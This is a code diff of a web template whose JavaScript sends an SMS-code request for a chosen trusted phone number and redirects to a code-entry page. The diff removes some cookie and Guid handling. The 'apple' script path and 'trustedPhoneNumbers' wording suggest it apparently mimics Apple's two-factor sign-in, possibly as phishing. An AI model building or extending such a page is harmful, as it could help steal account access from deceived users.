@@ -121,32 +121,16 @@
 <script type="text/javascript" src="{{ asset('/js/apple/fetch.js') }}"></script>
 <script >
 
-    const date = new Date();
-    date.setTime(date.getTime()+(60*1000*10));
-
-    const phoneCount = {{ $trustedPhoneNumbers->count() }};
-    document.cookie = `phoneCount=${phoneCount}; expires=${date}`;
-
     function sendCode (id,phone){
 
-        const Guid = getGrid('Guid');
-        if (Guid === null) {
-            return window.location.href = '/index/signin';
-        }
-
-        fetchRequest('/index/SendSms', 'Post',
-            {
-                Guid:Guid,ID:  id
-            })
+        fetchRequest('/index/SendSms', 'Post', {
+           ID:  id
+        })
             .then(response => {
 
-                console.log(response);
-
                 if (response.code === 200) {
-                    document.cookie = `ID=${id}; expires=${date}`;
-                    document.cookie = `Number=${phone}; expires=${date}`;
-                    document.cookie = `Guid=${Guid}; expires=${date}`;
-                    return window.location.href = '/index/sms?Number='+ phone + '&Guid='+Guid;
+
+                    return window.location.href = '/index/sms?Number='+ phone;
                 }
 
                 if (response.message){
@@ -158,7 +142,6 @@
             })
             .catch(error => {
                 console.error('There was a problem with the fetch operation:', error);
-
             });
     }
 
